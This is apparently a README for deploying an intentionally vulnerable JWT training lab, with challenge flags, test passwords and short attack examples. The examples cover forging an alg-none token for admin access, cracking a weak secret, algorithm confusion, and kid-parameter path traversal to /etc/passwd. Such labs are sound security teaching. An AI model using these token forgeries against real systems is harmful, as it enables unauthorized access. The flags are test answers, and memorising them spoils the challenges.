# 🔐 JWT Attacks Lab - Deployment Guide

## Quick Digital Ocean Deployment

### 1. Create Droplet
- **OS:** Ubuntu 22.04 LTS
- **Size:** $12/month (2GB RAM, 1 vCPU, 50GB SSD) - minimum
- **Region:** Choose closest to your location

### 2. Connect and Deploy
```bash
# SSH into your droplet
ssh root@YOUR_DROPLET_IP

# Install Docker and Docker Compose
curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh
curl -L "https://github.com/docker/compose/releases/download/v2.21.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# Clone and deploy
git clone https://github.com/hamzak-27/oswa-labs.git
cd oswa-labs/labs/oswa/jwt-attacks-lab/
chmod +x deploy-jwt-lab.sh
./deploy-jwt-lab.sh
```

### 3. Configuration
The script will ask for:
- **Domain name:** `jwt-lab.yourdomain.com`
- **Email:** For SSL certificates (optional)

### 4. Access Your Lab
- **Main Lab:** `https://your-domain/`
- **JWT Debugger:** `https://your-domain/debug/`
- **Backend API:** `https://your-domain/api/`

## What Gets Deployed

### 🔐 JWT Attack Challenges (1250 Points Total)
1. **None Algorithm Bypass** (100 pts) - `FLAG{JWT_N0N3_4LG0R1THM_BYP4SS}`
2. **Weak Secret Cracking** (250 pts) - `FLAG{JWT_W34K_S3CR3T_CR4CK3D}`
3. **Algorithm Confusion** (500 pts) - `FLAG{JWT_4LG0R1THM_C0NFUS10N_H4CK}`
4. **Kid Parameter Injection** (400 pts) - `FLAG{JWT_1NJ3CT10N_V1A_K1D_CL41M}`

### 🧪 Test Accounts
- `admin / admin123` (admin role)
- `alice / alice123` (user role) 
- `service_account / service123` (service role)
- `guest / guest123` (guest role)

### 🛠️ Services Included
- **React Frontend** - User interface for JWT lab
- **Node.js Backend** - API with intentional JWT vulnerabilities
- **JWT Debugger** - Token analysis and exploitation tool
- **MongoDB** - Database with test users and audit logs
- **Nginx** - Reverse proxy with SSL termination

### 🔒 Security Features
- SSL certificates (Let's Encrypt or self-signed)
- Firewall configuration with UFW
- Secure password generation
- VPN management interface
- Automated backups and monitoring

## Management Commands

```bash
# Monitor lab status
./monitor-jwt-lab.sh

# Create backup
./backup-jwt-lab.sh

# View logs
docker-compose -f docker-compose.production.yml logs -f

# Restart services
docker-compose -f docker-compose.production.yml restart

# Stop lab
docker-compose -f docker-compose.production.yml down

# Start lab
docker-compose -f docker-compose.production.yml up -d
```

## JWT Attack Examples

### None Algorithm Attack
```javascript
// Create JWT with none algorithm
const header = {"alg":"none","typ":"JWT"}
const payload = {"sub":"admin","role":"admin","permissions":["admin"]}
const token = btoa(JSON.stringify(header)) + "." + btoa(JSON.stringify(payload)) + "."

// Use token to access admin endpoints
fetch('/api/admin/users', {
  headers: { Authorization: `Bearer ${token}` }
})
```

### Weak Secret Cracking
```bash
# Get challenge token
curl https://your-domain/api/jwt/crack-challenge

# Crack using common passwords
jwt_tool.py TOKEN -C -d wordlist.txt
```

### Algorithm Confusion
```bash
# Get RSA public key
curl https://your-domain/api/jwt/pubkey

# Create HS256 token using public key as secret
# Access with ?force_hmac=true parameter
```

### Kid Parameter Injection
```javascript
// Create JWT with malicious kid parameter
const header = {"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
// Attempt file traversal via kid parameter
```

## Troubleshooting

### Check Service Status
```bash
docker-compose -f docker-compose.production.yml ps
```

### View Container Logs
```bash
docker-compose -f docker-compose.production.yml logs backend
docker-compose -f docker-compose.production.yml logs frontend
docker-compose -f docker-compose.production.yml logs jwt-debugger
```

### Health Checks
```bash
curl https://your-domain/api/health
curl https://your-domain/debug/health
```

### Rebuild Services
```bash
docker-compose -f docker-compose.production.yml down
docker-compose -f docker-compose.production.yml build --no-cache
docker-compose -f docker-compose.production.yml up -d
```

## Security Notes

⚠️ **This lab contains intentional security vulnerabilities!**

- Only use in isolated environments
- Never deploy to production networks
- Review and secure the `DEPLOYMENT_CREDENTIALS.txt` file
- Delete credentials file after noting the information

## Support

For issues or questions:
1. Check container logs
2. Run `./monitor-jwt-lab.sh`
3. Verify firewall and DNS settings
4. Ensure adequate server resources (2GB RAM minimum)

Happy JWT hacking! 🔐⚡